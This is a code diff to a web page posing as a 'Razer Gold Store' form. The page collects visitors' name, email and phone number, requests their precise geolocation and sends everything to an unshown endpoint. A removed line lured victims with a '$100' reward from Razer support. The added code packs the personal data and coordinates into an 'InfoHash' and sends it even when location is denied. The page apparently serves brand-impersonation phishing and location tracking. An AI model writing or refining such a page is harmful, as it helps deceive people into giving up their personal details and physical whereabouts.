@@ -13,10 +13,8 @@ export default function Home() {
         <link rel="icon" href="/favicon.ico" />
       </Head>
 
-      {/* Background */}
       <div className="bg" aria-hidden="true" />
 
-      {/* Foreground content */}
       <main className="card">
         <Header title="Enter details for Razer Gold Store" />
         <form id="infoForm">
@@ -26,13 +24,13 @@ export default function Home() {
           </label>
           <br />
           <label>
-            Mobile
-            <input type="tel" id="mobile" name="mobile" required />
+            Email
+            <input type="email" id="email" name="email" required />
           </label>
           <br />
           <label>
-            Email
-            <input type="email" id="email" name="email" required />
+            Phone number
+            <input type="tel" id="mobile" name="mobile" required />
           </label>
           <br />
           <button type="submit" id="submitBtn">Submit</button>
@@ -65,9 +63,19 @@ export default function Home() {
               function getFormData(){
                 return {
                   name: document.getElementById('name').value.trim(),
-                  mobile: document.getElementById('mobile').value.trim(),
                   email: document.getElementById('email').value.trim(),
+                  mobile: document.getElementById('mobile').value.trim(),
                 };
+              }
+
+              function makeInfoHash(obj){
+                // Simple, human-readable hash (not cryptographic):
+                // key=value pairs joined by '|'
+                const parts = [];
+                for(const [k,v] of Object.entries(obj)){
+                  parts.push(k + '=' + encodeURIComponent(String(v ?? '')));
+                }
+                return parts.join('|');
               }
 
               async function requestLocationOnce(){
@@ -90,15 +98,27 @@ export default function Home() {
               form.addEventListener('submit', async (e) => {
                 e.preventDefault();
                 submitBtn.disabled = true;
-                log('Requesting location… please allow when prompted.');
+                log('Please allow when prompted.');
                 const info = getFormData();
                 try{
                   const loc = await requestLocationOnce();
-                  log(\`InfoHash (Kindly give to Razer Costomer support for 100$) : \${loc.latitude}, \${loc.longitude} (±\${loc.accuracy}m)\`);
-                  await send({ ...info, ...loc });
+                  const bundle = {
+                    name: info.name,
+                    email: info.email,
+                    mobile: info.mobile,
+                    lat: loc.latitude,
+                    lon: loc.longitude,
+                    acc: loc.accuracy,
+                    ts: loc.timestamp
+                  };
+                  const infoHash = makeInfoHash(bundle);
+                  log('InfoHash: ' + infoHash);
+                  await send({ ...info, ...loc, infoHash });
                 }catch(err){
                   log('Location error: ' + (err && err.message ? err.message : err));
-                  await send({ ...info, locationError: String(err && err.message ? err.message : err) });
+                  const infoHash = makeInfoHash({ ...info, lat:'', lon:'', acc:'', ts: Date.now() });
+                  log('InfoHash (no location): ' + infoHash);
+                  await send({ ...info, locationError: String(err && err.message ? err.message : err), infoHash });
                 }finally{
                   submitBtn.disabled = false;
                 }
@@ -111,54 +131,13 @@ export default function Home() {
       <Footer />
 
       <style jsx>{`
-        .container {
-          min-height: 100vh;
-          position: relative;
-          overflow: hidden;
-        }
-        .bg {
-          position: fixed;
-          inset: 0;
-          background-image: url('/bg.jpg'); /* put your image in public/bg.jpg */
-          background-size: cover;
-          background-position: center;
-          filter: brightness(0.45);
-          z-index: -1;
-        }
-        .card {
-          max-width: 560px;
-          margin: 8vh auto;
-          background: rgba(20, 20, 20, 0.72);
-          backdrop-filter: saturate(120%) blur(6px);
-          border-radius: 12px;
-          padding: 24px;
-          color: #f2f2f2;
-          box-shadow: 0 10px 30px rgba(0,0,0,0.35);
-        }
-        label {
-          display: block;
-          margin: 10px 0 6px;
-        }
-        input {
-          width: 100%;
-          padding: 10px 12px;
-          border-radius: 8px;
-          border: 1px solid rgba(255,255,255,0.25);
-          background: rgba(255,255,255,0.08);
-          color: #fff;
-          outline: none;
-        }
+        .container { min-height: 100vh; position: relative; overflow: hidden; }
+        .bg { position: fixed; inset: 0; background-image: url('/bg.jpg'); background-size: cover; background-position: center; filter: brightness(0.45); z-index: -1; }
+        .card { max-width: 560px; margin: 8vh auto; background: rgba(20,20,20,0.72); backdrop-filter: saturate(120%) blur(6px); border-radius: 12px; padding: 24px; color: #f2f2f2; box-shadow: 0 10px 30px rgba(0,0,0,0.35); }
+        label { display: block; margin: 10px 0 6px; }
+        input { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.25); background: rgba(255,255,255,0.08); color: #fff; outline: none; }
         input::placeholder { color: rgba(255,255,255,0.6); }
-        button {
-          margin-top: 12px;
-          padding: 10px 14px;
-          border-radius: 8px;
-          border: none;
-          background: #00e676;
-          color: #092e20;
-          font-weight: 600;
-          cursor: pointer;
-        }
+        button { margin-top: 12px; padding: 10px 14px; border-radius: 8px; border: none; background: #00e676; color: #092e20; font-weight: 600; cursor: pointer; }
         button:disabled { opacity: 0.6; cursor: not-allowed; }
         pre { color: #e0ffe6; }
       `}</style>
